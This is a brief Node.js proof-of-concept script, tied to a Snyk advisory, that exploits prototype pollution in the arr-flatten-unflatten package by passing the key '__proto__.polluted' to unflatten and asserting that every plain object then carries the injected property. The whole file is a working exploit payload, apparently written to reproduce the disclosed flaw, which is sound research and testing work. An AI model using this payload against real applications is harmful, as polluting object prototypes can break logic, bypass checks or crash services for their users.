//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396

const { unflatten } = require('arr-flatten-unflatten');
const assert = require('assert');
var obj = {}
console.log("Before : " + obj.polluted);

unflatten({'__proto__.polluted':"yes"});

console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");